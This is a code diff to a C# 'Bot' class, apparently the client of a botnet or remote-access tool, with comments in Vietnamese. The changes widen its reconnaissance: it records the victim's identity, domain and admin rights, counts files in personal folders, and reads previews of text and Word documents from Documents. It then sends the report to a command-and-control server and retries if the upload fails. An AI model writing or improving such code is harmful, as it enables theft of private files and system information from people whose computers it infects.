@@ -345,7 +345,27 @@ public class Bot
             report.AppendLine($"Time: {DateTime.Now}");
             report.AppendLine($"OS: {Environment.OSVersion}");
             report.AppendLine($"User: {Environment.UserName}");
+            report.AppendLine($"User Domain: {Environment.UserDomainName}");
+
+            try
+            {
+                var currentUser = System.Security.Principal.WindowsIdentity.GetCurrent();
+                report.AppendLine($"User (Windows Identity): {currentUser.Name}");
+                report.AppendLine($"Is Elevated (Admin): {IsAdministrator()}");
+            }
+            catch (Exception ex)
+            {
+                report.AppendLine($"[!] Cannot get Windows Identity: {ex.Message}");
+            }
+
+            report.AppendLine("\n[PATH RESOLUTION]");
+            report.AppendLine($"UserProfile: {Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}");
+            report.AppendLine($"Desktop: {Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}");
+            report.AppendLine($"Documents: {Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}");
+            report.AppendLine($"Downloads: {Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")}");
             report.AppendLine("--------------------------------------------------");
+
+
 
             // 1. Lấy thông tin phần cứng (CPU/RAM)
             try
@@ -386,9 +406,14 @@ public class Bot
 
             report.AppendLine("--------------------------------------------------");
 
+            report.AppendLine("[FOLDER EXISTENCE CHECK]");
+            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            CheckFolderContent(userPath, report);
+            report.AppendLine("--------------------------------------------------");
+
             // 2. Quét nhanh Desktop và Documents (Giới hạn độ sâu để tránh quá nặng)
             report.AppendLine("[FILE SYSTEM SCAN - TOP LEVEL]");
-            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            //string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
             ScanFolder(userPath, report, 0, 2); // Chỉ quét sâu 2 lớp thư mục
 
             report.AppendLine("--------------------------------------------------");
@@ -398,21 +423,97 @@ public class Bot
             string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
             await ExtractDocumentContents(documentsPath, report);
 
-            // 3. Gửi về Server
+            int reportSize = report.Length;
+            Console.WriteLine($"[RECON] Report built. Size: {reportSize} chars ({reportSize / 1024} KB)");
+
+            //// 3. Gửi về Server
+            //Console.WriteLine("[RECON] Sending report to C&C...");
+            //await SendReconToServerAsync(report.ToString());
+
+            //Console.WriteLine("[RECON] Report sent successfully.");
+
+            //// Sau khi xong thì quay về Idle
+            //currentStatus = BotCommands.ReconDone;
+            //await SendLogToServerAsync("Recon complete. Waiting for new commands.");
             Console.WriteLine("[RECON] Sending report to C&C...");
-            await SendReconToServerAsync(report.ToString());
+            bool sendSuccess = await SendReconToServerAsync(report.ToString());
 
-            Console.WriteLine("[RECON] Report sent successfully.");
-
-            // Sau khi xong thì quay về Idle
-            currentStatus = BotCommands.ReconDone;
-            await SendLogToServerAsync("Recon complete. Waiting for new commands.");
+            if (sendSuccess)
+            {
+                Console.WriteLine("[RECON] Report sent successfully.");
+                currentStatus = BotCommands.ReconDone;
+                await SendLogToServerAsync("Recon complete. Waiting for new commands.");
+            }
+            else
+            {
+                Console.WriteLine("[RECON] Send failed after retries.");
+                currentStatus = BotCommands.Idle; // Quay về idle thay vì stuck ở recon_done
+                await SendLogToServerAsync("Recon Failed: Network timeout");
+            }
         }
         catch (Exception ex)
         {
             Console.WriteLine($"[RECON ERROR] {ex.Message}");
             await SendLogToServerAsync($"Recon Failed: {ex.Message}");
             currentStatus = BotCommands.ReconDone;
+        }
+    }
+    static void CheckFolderContent(string basePath, StringBuilder report)
+    {
+        try
+        {
+            var foldersToCheck = new[]
+            {
+            ("UserProfile", basePath),
+            ("Desktop", Path.Combine(basePath, "Desktop")),
+            ("Documents", Path.Combine(basePath, "Documents")),
+            ("Downloads", Path.Combine(basePath, "Downloads")),
+            ("Pictures", Path.Combine(basePath, "Pictures")),
+            ("Videos", Path.Combine(basePath, "Videos"))
+        };
+
+            foreach (var (name, path) in foldersToCheck)
+            {
+                if (Directory.Exists(path))
+                {
+                    try
+                    {
+                        var fileCount = Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly).Length;
+                        var dirCount = Directory.GetDirectories(path).Length;
+                        report.AppendLine($"✓ {name}: {path}");
+                        report.AppendLine($"  → {fileCount} files, {dirCount} subfolders");
+                    }
+                    catch (UnauthorizedAccessException)
+                    {
+                        report.AppendLine($"✗ {name}: {path} [ACCESS DENIED]");
+                    }
+                    catch (Exception ex)
+                    {
+                        report.AppendLine($"✗ {name}: {path} [ERROR: {ex.Message}]");
+                    }
+                }
+                else
+                {
+                    report.AppendLine($"✗ {name}: {path} [DOES NOT EXIST]");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            report.AppendLine($"[!] Folder check failed: {ex.Message}");
+        }
+    }
+    static bool IsAdministrator()
+    {
+        try
+        {
+            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+            var principal = new System.Security.Principal.WindowsPrincipal(identity);
+            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+        }
+        catch
+        {
+            return false;
         }
     }
     static Task ExtractDocumentContents(string documentsPath, StringBuilder report)
@@ -432,10 +533,11 @@ public class Bot
             var docxFiles = Directory.GetFiles(documentsPath, "*.docx", SearchOption.TopDirectoryOnly);
 
             int fileCount = 0;
-            const int MaxFiles = 10; // Giới hạn 10 file để tránh báo cáo quá dài
+            const int MaxFiles = 5; // Giới hạn 10 file để tránh báo cáo quá dài
+            const int MaxPreviewChars = 300;
 
-            // Đọc file .txt
-            foreach (var filePath in txtFiles)
+                // Đọc file .txt
+                foreach (var filePath in txtFiles)
             {
                 if (fileCount >= MaxFiles) break;
 
@@ -447,11 +549,13 @@ public class Bot
                     if (fileInfo.Length > 1 * 1024 * 1024) continue;
 
                     report.AppendLine($"\n[TXT FILE] {fileInfo.Name} ({fileInfo.Length / 1024} KB)");
-                    report.AppendLine("--- Content Preview (First 500 chars) ---");
+                    report.AppendLine("--- Content Preview (First 300 chars) ---");
 
                     string content = File.ReadAllText(filePath);
-                    string preview = content.Length > 500 ? content.Substring(0, 500) + "..." : content;
-                    report.AppendLine(preview);
+                        string preview = content.Length > MaxPreviewChars
+                            ? content.Substring(0, MaxPreviewChars) + "..."
+                            : content;
+                        report.AppendLine(preview);
                     report.AppendLine("------------------------------------------");
 
                     fileCount++;
@@ -481,8 +585,10 @@ public class Bot
                     report.AppendLine("--- Content Preview ---");
 
                     string docxContent = ExtractTextFromDocx(filePath);
-                    string preview = docxContent.Length > 500 ? docxContent.Substring(0, 500) + "..." : docxContent;
-                    report.AppendLine(preview);
+                        string preview = docxContent.Length > MaxPreviewChars
+                            ? docxContent.Substring(0, MaxPreviewChars) + "..."
+                            : docxContent;
+                        report.AppendLine(preview);
                     report.AppendLine("------------------------------------------");
 
                     fileCount++;
@@ -569,22 +675,59 @@ public class Bot
         catch { /* Bỏ qua lỗi Access Denied */ }
     }
 
-    static async Task SendReconToServerAsync(string reportContent)
+    static async Task<bool> SendReconToServerAsync(string reportContent)
     {
-        try
+        int maxRetries = 3;
+        int timeoutSeconds = 60; // ← TĂNG TỪ 10s LÊN 60s
+
+        for (int attempt = 1; attempt <= maxRetries; attempt++)
         {
-            var payload = new ReconPayload { Report = reportContent };
-            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
-            // Tăng timeout lên 10s vì báo cáo có thể dài
-            using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10)))
+            try
             {
-                await client.PostAsync($"{CncServerUrl}/bot/submitrecon", content, cts.Token);
+                Console.WriteLine($"[RECON] Sending attempt {attempt}/{maxRetries}...");
+
+                var payload = new ReconPayload { Report = reportContent };
+                var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
+
+                using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutSeconds)))
+                {
+                    var response = await client.PostAsync($"{CncServerUrl}/bot/submitrecon", content, cts.Token);
+
+                    if (response.IsSuccessStatusCode)
+                    {
+                        Console.WriteLine($"[RECON] Send successful on attempt {attempt}");
+                        return true; // ← Thành công
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[RECON] Server returned: {response.StatusCode}");
+                    }
+                }
+            }
+            catch (TaskCanceledException)
+            {
+                Console.WriteLine($"[RECON] Attempt {attempt} timed out after {timeoutSeconds}s");
+
+                // Nếu chưa hết retry, đợi 2s rồi thử lại
+                if (attempt < maxRetries)
+                {
+                    Console.WriteLine("[RECON] Waiting 2s before retry...");
+                    await Task.Delay(2000);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[RECON] Network Error on attempt {attempt}: {ex.Message}");
+
+                if (attempt < maxRetries)
+                {
+                    await Task.Delay(2000);
+                }
             }
         }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"[Network Error] Send Recon: {ex.Message}");
-        }
+
+        Console.WriteLine("[RECON] All retry attempts failed.");
+        return false; // ← Thất bại sau 3 lần thử
     }
 
     // === NÂNG CẤP: Hàm helper để hủy tác vụ một cách an toàn ===
